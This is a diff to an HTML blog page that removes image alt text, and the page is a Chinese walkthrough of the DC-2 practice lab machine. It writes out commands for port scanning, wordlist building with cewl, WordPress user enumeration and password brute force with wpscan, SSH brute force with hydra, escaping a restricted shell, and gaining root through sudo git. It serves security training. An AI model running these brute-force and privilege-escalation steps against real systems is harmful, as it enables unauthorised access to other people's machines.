@@ -103,17 +103,17 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>老规矩先arp扫存活主机<br><img src="https://img-blog.csdnimg.cn/0851058cc68941a4ad35b49df82ab1ab.png" alt="在这里插入图片描述">nmap扫端口</p>
-<p><img src="https://img-blog.csdnimg.cn/2dc6c30061a34b3281915ee09e51862e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到http和ssh端口开放，先从80端口入手，结果发现访问的时候网站自动跳转dc-2,说明域名解析错误。解决方法是在hosts文件中添加对应的IP和域名</p>
-<p><img src="https://img-blog.csdnimg.cn/f0e024e540994876b20fbaa1bb213a74.png" alt="在这里插入图片描述">接着直接访问dc-2，找到flag1</p>
-<p><img src="https://img-blog.csdnimg.cn/d684145214b643d1b365acdccab57fcb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现关键词cewl</p>
+  <p>老规矩先arp扫存活主机<br><img src="https://img-blog.csdnimg.cn/0851058cc68941a4ad35b49df82ab1ab.png">nmap扫端口</p>
+<p><img src="https://img-blog.csdnimg.cn/2dc6c30061a34b3281915ee09e51862e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到http和ssh端口开放，先从80端口入手，结果发现访问的时候网站自动跳转dc-2,说明域名解析错误。解决方法是在hosts文件中添加对应的IP和域名</p>
+<p><img src="https://img-blog.csdnimg.cn/f0e024e540994876b20fbaa1bb213a74.png">接着直接访问dc-2，找到flag1</p>
+<p><img src="https://img-blog.csdnimg.cn/d684145214b643d1b365acdccab57fcb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>发现关键词cewl</p>
 <blockquote>
 <p>cewl是一个ruby应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John theripper工具里进行密码破解。</p>
 </blockquote>
 <blockquote>
 <p>cewl -w passwd.txt <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a></p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/45ff8b81262e48ed86b48aacf3e86251.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/45ff8b81262e48ed86b48aacf3e86251.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16"></p>
 <p>访问dc-2时可以知道网页cms为WordPress,直接通过wpscan探测用户</p>
 <p><strong>wpscan</strong></p>
 <blockquote>
@@ -127,13 +127,13 @@
 <blockquote>
 <p>1、扫描WordPress漏洞<br>wpscan –url <a target="_blank" rel="noopener" href="http://www.xxxxx.top/">http://www.xxxxx.top/</a><br>2、扫描wordpress用户<br>wpscan –url <a target="_blank" rel="noopener" href="http://www.xxxxx.top/">http://www.xxxxx.top/</a> –enumerate u<br>3、扫描主题<br>wpscan –url <a target="_blank" rel="noopener" href="http://www.xxxxx.top/">http://www.xxxxx.top/</a> –enumerate t<br>4、扫描插件漏洞<br>wpscan –url<a target="_blank" rel="noopener" href="http://www.xxxxx.top/">http://www.xxxxx.top/</a> –enumerate p<br>5、使用WPScan进行暴力破解在进行暴力破解攻击之前，我们需要创建对应的字典文件。输入下列命令：<br>wpscan –url <a target="_blank" rel="noopener" href="https://www.xxxxx.top/-e">https://www.xxxxx.top/-e</a> u –wordlist /root/桌面/password.txt</p>
 </blockquote>
-<p>扫描得到三个用户，写入user.txt中<br><img src="https://img-blog.csdnimg.cn/8921e78809814e198141d057bc89d796.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/70abd597076f4971b5cac60fcb319293.png" alt="在这里插入图片描述"><br>接着用wpscan爆出用户密码</p>
+<p>扫描得到三个用户，写入user.txt中<br><img src="https://img-blog.csdnimg.cn/8921e78809814e198141d057bc89d796.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16"></p>
+<p><img src="https://img-blog.csdnimg.cn/70abd597076f4971b5cac60fcb319293.png"><br>接着用wpscan爆出用户密码</p>
 <blockquote>
 <p>wpscan –url dc-2 user.txt -P passwd.txt</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/66239d7cf4904af08906969a3ff6ac0a.png" alt="在这里插入图片描述"><br>访问WordPress默认登录界面 /wp-login.php,登录jerry的时候发现flag2</p>
-<p><img src="https://img-blog.csdnimg.cn/17e6df03d35e4f1e8ac2bb0b70f3cfb8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>flag提示让我们换条路走，想到nmap扫描的时候还扫出了一个7744端口（ssh）,使用hydra爆破ssh</p>
+<p><img src="https://img-blog.csdnimg.cn/66239d7cf4904af08906969a3ff6ac0a.png"><br>访问WordPress默认登录界面 /wp-login.php,登录jerry的时候发现flag2</p>
+<p><img src="https://img-blog.csdnimg.cn/17e6df03d35e4f1e8ac2bb0b70f3cfb8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>flag提示让我们换条路走，想到nmap扫描的时候还扫出了一个7744端口（ssh）,使用hydra爆破ssh</p>
 <p>hydra使用方法</p>
 <blockquote>
 <p>-R 根据上一次进度继续破解<br>-S 使用SSL协议连接<br>-s 指定端口<br>-l 指定用户名<br>-L 指定用户名字典(文件)<br>-p 指定密码破解<br>-P 指定密码字典(文件)<br>-e 空密码探测和指定用户密码探测(ns)<br>-C 用户名可以用:分割(username:password)可以代替-l username -p password<br>-o 输出文件<br>-t 指定多线程数量，默认为16个线程<br>-vV 显示详细过程</p>
@@ -142,17 +142,17 @@
 <blockquote>
 <p>hydra -L user.txt -P passwd.txt ssh://192.168.111.133 -s 7744 -o hydra.ssh -vV</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/996b8237c8b14230bc1a5903781f76ca.png" alt="在这里插入图片描述">登录ssh</p>
-<p><img src="https://img-blog.csdnimg.cn/775c32c581c04e0595f4c9138583c4e9.png" alt="在这里插入图片描述"><br>ls发现flag3，但是由于权限无法使用cat命令</p>
-<p><img src="https://img-blog.csdnimg.cn/acd121ad7a504193b472145f40ea124e.png" alt="在这里插入图片描述"><br>这里有两种方法拿到flag3<br>尝试用ls命令发现ls没有被限制，查看usr子目录，可以看到vi没有被限制，用vi绕过rbash</p>
-<p><img src="https://img-blog.csdnimg.cn/530cf97fc086455f993323b4398a297d.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2156ad33d1f446ff98c46b07186c66cd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>另一种方法是先绕过rbash再添加环境变量</p>
-<p><img src="https://img-blog.csdnimg.cn/303dedefd837445c9803a207b7c84e30.png" alt="在这里插入图片描述"><br>添加环境变量</p>
+<p><img src="https://img-blog.csdnimg.cn/996b8237c8b14230bc1a5903781f76ca.png">登录ssh</p>
+<p><img src="https://img-blog.csdnimg.cn/775c32c581c04e0595f4c9138583c4e9.png"><br>ls发现flag3，但是由于权限无法使用cat命令</p>
+<p><img src="https://img-blog.csdnimg.cn/acd121ad7a504193b472145f40ea124e.png"><br>这里有两种方法拿到flag3<br>尝试用ls命令发现ls没有被限制，查看usr子目录，可以看到vi没有被限制，用vi绕过rbash</p>
+<p><img src="https://img-blog.csdnimg.cn/530cf97fc086455f993323b4398a297d.png"><br><img src="https://img-blog.csdnimg.cn/2156ad33d1f446ff98c46b07186c66cd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>另一种方法是先绕过rbash再添加环境变量</p>
+<p><img src="https://img-blog.csdnimg.cn/303dedefd837445c9803a207b7c84e30.png"><br>添加环境变量</p>
 <blockquote>
 <p>export PATH=$ PATH:/bin/<br>export PATH=$ PATH:/usr/bin</p>
 </blockquote>
-<p>成功绕过拿到flag3<br><img src="https://img-blog.csdnimg.cn/1aabc0194621454fa2145b9855cf5cd6.png" alt="在这里插入图片描述"></p>
+<p>成功绕过拿到flag3<br><img src="https://img-blog.csdnimg.cn/1aabc0194621454fa2145b9855cf5cd6.png"></p>
 <p>flag3提示我们从jerry入手，pwd查看tom路径，发现在home目录中，在home目录果然找到jerry,接着在jerry中找到flag4</p>
-<p><img src="https://img-blog.csdnimg.cn/39488eae2cfb4231b1761e99f7a51068.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现关键词git,猜测用git提权获得root权限<br>先查看具有root权限的suid文件<br><img src="https://img-blog.csdnimg.cn/694fbba293ae4d8991cb0e547a0d0af4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_16,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>发现能用sudo,满足执行sudo -l 提示不需要密码可以使用git命令的前提<br><img src="https://img-blog.csdnimg.cn/462042aff9424438957c831aac94f7c9.png" alt="在这里插入图片描述">git提权</p>
+<p><img src="https://img-blog.csdnimg.cn/39488eae2cfb4231b1761e99f7a51068.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16"><br>发现关键词git,猜测用git提权获得root权限<br>先查看具有root权限的suid文件<br><img src="https://img-blog.csdnimg.cn/694fbba293ae4d8991cb0e547a0d0af4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_16,color_FFFFFF,t_70,g_se,x_16"><br>发现能用sudo,满足执行sudo -l 提示不需要密码可以使用git命令的前提<br><img src="https://img-blog.csdnimg.cn/462042aff9424438957c831aac94f7c9.png">git提权</p>
 <blockquote>
 <p>前提：执行sudo -l 提示不需要密码可以使用提权方法<br> 1、sudo git help config<br> #在末行命令模式输入 !/bin/bash 或 !’sh’ #完成提权<br>2、sudo git -p –help  !/bin/bash<br>#输入!/bin/bash，即可打开一个用户为root的shell</p>
 </blockquote>
@@ -160,8 +160,8 @@
 <blockquote>
 <p>!/bin/sh</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/402ba509eff3410781bc9acde6242ed8.png" alt="在这里插入图片描述">成功获得root权限<br><img src="https://img-blog.csdnimg.cn/73e590d60f1045fa93cf2e2991e445cf.png" alt="在这里插入图片描述"><br>在root目录中找到最后一个flag</p>
-<p><img src="https://img-blog.csdnimg.cn/fe16e0b2c4f94db797ae691d1a6245f6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/402ba509eff3410781bc9acde6242ed8.png">成功获得root权限<br><img src="https://img-blog.csdnimg.cn/73e590d60f1045fa93cf2e2991e445cf.png"><br>在root目录中找到最后一个flag</p>
+<p><img src="https://img-blog.csdnimg.cn/fe16e0b2c4f94db797ae691d1a6245f6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16"></p>
  
       <!-- reward -->
       
